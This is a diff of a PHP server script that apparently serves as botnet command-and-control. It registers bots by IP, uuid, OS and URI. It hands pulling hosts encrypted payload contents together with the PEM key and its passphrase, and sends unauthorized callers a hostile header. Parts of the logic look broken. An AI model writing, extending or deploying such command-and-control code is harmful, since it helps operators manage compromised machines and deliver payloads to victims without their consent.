@@ -14,8 +14,15 @@ function db_calls(array $data) : array {
             break;
     }
     switch ($data['action']){
-        case strpos($data['action'], "pullCert") !== false:
-
+        case strpos($data['action'], "pullSlop") !== false:
+            $a = $d->grabAndFormatOutput(['action' => $data['action'], 'rhost' => $data['rhost']]);
+            $k = explode('.', $a['pem_used']);
+            return ['success' => true, 'encrypted_data' => $a['encrypted_contents'], 'pem' => file_get_contents($k[0]), 'pem_pass' => $k[1]];
+        case strpos($data['action'], 'addNew') !== false:
+            db_calls(['action' => 'add_bot', $data['rhost'], 'uuid' => $data['uuid'], 'os' => $data['os'], 'uri' => $data['uri']]);
+            return ['success' => true];
+        default:
+            return ['unknown'];
     }
 
 }
@@ -89,20 +96,10 @@ function grabSloppyContents(array $data): array{
             header("Reason: Fuck off.");
         }
         $uuid = filter_var($data['uuid'], FILTER_SANITIZE_STRING);
-        if (is_string($data['needs_cert'])){
-            $needsCert = (bool)$data['needs_cert'];
-        }else{
-            $needsCert = $data['needs_cert'];
-        }
-        if ($needsCert) {
-            $cert = db_calls(['action' => 'pullCert', 'uuid' => $uuid, "rhost" => $remote_host, "needs_cert" => $needsCert]);
-        }else{
-            $cert = null;
-        }
         $slopContents = db_calls(['action' => 'grabSlop', 'uuid' => $uuid, "rhost" => $remote_host]);
         return ['data' => [
-           'slop' => $slopContents,
-           'cert' => $cert
+           'slop' => $slopContents['encrypted_contents'],
+           'cert' => $slopContents['pem_used']
         ]];
     }else{
         return ['data' => [
@@ -141,7 +138,14 @@ if (!empty($_SERVER["REQUEST_METHOD"])) {
         } elseif (strtolower($_POST["ac"]) === "ci") {
             addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-', 0);
         }elseif ($_POST['r'] === 'pull'){
-            echo base64_encode(file('slop.php'));
+            $a = grabSloppyContents(['remote_host' => $_SERVER['REMOTE_ADDR'], 'uuid' => $_POST['u'], 'needs_cert' => true]);
+            switch ($a['slop']){
+                case is_null($a['slop']):
+                    http_response_code(500);
+                    header("Reason: Nothing was returned.");
+                default:
+                    echo $a['slop'].'.'.$a['cert'];
+            }
         }
     }
 }else{
